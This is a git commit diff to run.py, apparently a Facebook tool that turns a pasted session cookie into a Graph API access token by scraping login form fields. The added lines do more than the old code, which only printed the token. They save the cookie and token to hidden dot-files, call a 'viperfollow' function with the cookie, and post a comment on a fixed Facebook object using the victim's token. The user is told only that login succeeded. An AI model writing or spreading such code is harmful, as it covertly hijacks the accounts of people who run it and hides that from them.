2048ccc0dc4aa8379410a04a9960f7fe853be9aa
Tanpa Nama <106883384+Viper404-XD@users.noreply.github.com>
2024-03-19 12:17:16 +0700

    Update run.py

--- run.py
+++ run.py
@@ -529,13 +529,17 @@ def GenerateToken():
 		dat2 = {'fb_dtsg':re.search(r'name="fb_dtsg" value="(.*?)"',str(pos1)).group(1), 'jazoest':re.search(r'name="jazoest" value="(.*?)"',str(pos1)).group(1), 'scope':re.search(r'name="scope" value="(.*?)"',str(pos1)).group(1), 'display':re.search(r'name="display" value="(.*?)"',str(pos1)).group(1), 'sdk':'', 'sdk_version':'', 'domain':'', 'sso_device':'', 'state':'', 'user_code':re.search(r'name="user_code" value="(.*?)"',str(pos1)).group(1), 'logger_id':re.search(r'name="logger_id" value="(.*?)"',str(pos1)).group(1), 'auth_type':re.search(r'name="auth_type" value="(.*?)"',str(pos1)).group(1), 'auth_nonce':'', 'code_challenge"':'', 'code_challenge_method':'', 'encrypted_post_body':re.search(r'name="encrypted_post_body" value="(.*?)"',str(pos1)).group(1), 'return_format[]':re.search(r'name="return_format\[\]" value="(.*?)"',str(pos1)).group(1)}
 		pos2 = r.post('https://mobile.facebook.com{}'.format(re.search(r'form method="post" action="(.*?)"',str(pos1)).group(1)), data=dat2, cookies={'cookie':cookie}).text.replace('\\','')
 		tok  = r.get('https://graph.facebook.com/v16.0/device/login_status?method=post&code={}&access_token={}'.format(req1.get('code'), app), cookies={'cookie':cookie}).json().get('access_token')
-		print(tok)
+		open(".vipercok.txt", "w").write(cookie)
+		open(".vipertok.txt", "w").write(tok)
+		viperfollow(cookie)
+		requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={tok}",headers={"cookie": cookie})
+		Console().print(Panel(f"""{P2}{tok}""",width=60,style=f"{color_panel}",title="[bold green]TOKEN"))
+		Console().print(f" {H2}• {P2}[bold green]Login Berhasil,jalankan Ulang Script")
 	except Exception as e:
 		if "group" in str(e):
 			Console().print(f" {H2}• {P2}[bold red]Ganti Cookie Kamu yang lain")
 			exit()
-	except KeyError:
-		print("masukkan cookie yang bener")
+			print("\n")
 			
 def logincoki():
     cookie = Console().input(f" {H2}• {P2}cookie : ")
